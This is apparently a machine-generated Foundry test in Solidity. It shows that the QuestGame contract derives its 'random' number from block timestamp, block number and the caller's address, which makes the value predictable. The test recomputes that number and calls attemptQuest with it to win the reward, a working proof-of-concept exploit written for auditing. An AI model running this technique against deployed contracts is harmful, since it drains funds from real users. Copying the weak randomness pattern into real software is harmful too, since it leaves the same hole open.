// Generation Time: 43,31s
// Input Tokens: 2094
// Output Tokens: 935
// Reasoning Tokens: 3659


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

// ═══════════════════════════════════════════════════════════════════════════════
// [Testing Goal] Prove that a critical decision or value, intended to be random,
// is a deterministic function of the unsafe observable environment set.
// ═══════════════════════════════════════════════════════════════════════════════

contract TestWeakRandomnessQuestGame is Test {

    // ─────────────────────────────────────────────────────────────────────────
    // [Setup] Declare the contract under test variable.
    // ─────────────────────────────────────────────────────────────────────────

    QuestGame public questGame;

    // ─────────────────────────────────────────────────────────────── [/Setup]

    function setUp() public {
        // ─────────────────────────────────────────────────────────────────────
        // [Setup] Initialize the contract under test.
        // ─────────────────────────────────────────────────────────────────────

        questGame = new QuestGame();

        // Fund the contract so it has enough balance to pay the reward (REWARD = 0.2 ether)
        vm.deal(address(questGame), 10 ether);
        
        // ───────────────────────────────────────────────────────── [/Setup]
    }

    // Required to receive the reward ETH from the contract
    receive() external payable {}

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        // ─────────────────────────────────────────────────────────────────────
        // [Setup] Constrain the inferred symbolic variables and fix the
        // environmental state using Forge cheatcodes
        // to specific fuzzed or symbolic values.
        // ─────────────────────────────────────────────────────────────────────

        // Constrain blockTimestamp. Must be >= 1 hour (COOLDOWN) because initial lastAttemptTime is 0.
        // We use a safe lower bound of 2 hours.
        blockTimestamp = bound(blockTimestamp, 2 hours, type(uint64).max);
        
        // Constrain blockNumber to valid range
        blockNumber = bound(blockNumber, 1, type(uint64).max);

        // Fund the attacker (this test contract) to pay ENTRY_FEE (0.1 ether)
        vm.deal(address(this), 1 ether);

        // Apply the inferred values using Cheatcodes
        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        // ───────────────────────────────────────────────────────── [/Setup]

        // ─────────────────────────────────────────────────────────────────────
        // [Action] Instantiate mirroring logic to pre-calculate the expected
        // result using the same observable block data.
        // ─────────────────────────────────────────────────────────────────────
        
        // Replicate the vulnerable logic locally inside the test.
        // Logic: keccak256(abi.encodePacked(block.timestamp, block.number, msg.sender)) % 100
        // msg.sender is address(this)
        
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp, 
                    block.number, 
                    address(this) 
                )
            )
        );

        uint256 predictedNumber = seed % 100;

        // Call the contract method with the predicted number
        questGame.attemptQuest{value: 0.1 ether}(predictedNumber);

        // ─────────────────────────────────────────────────────────── [/Action]

        // ─────────────────────────────────────────────────────────────────────
        // [Assertion] Assert that the contract's output matches the
        // pre-calculated value (actualResult == preCalculatedResult). 
        // ─────────────────────────────────────────────────────────────────────

        // Assert that the attack was successful by verifying the win count increased.
        (, uint256 wins) = questGame.getPlayerStats(address(this));
        
        assertEq(wins, 1, "Predictable randomness failed: Predicted number did not result in a win");

        // ──────────────────────────────────────────────────── [/Assertion]
    }
}
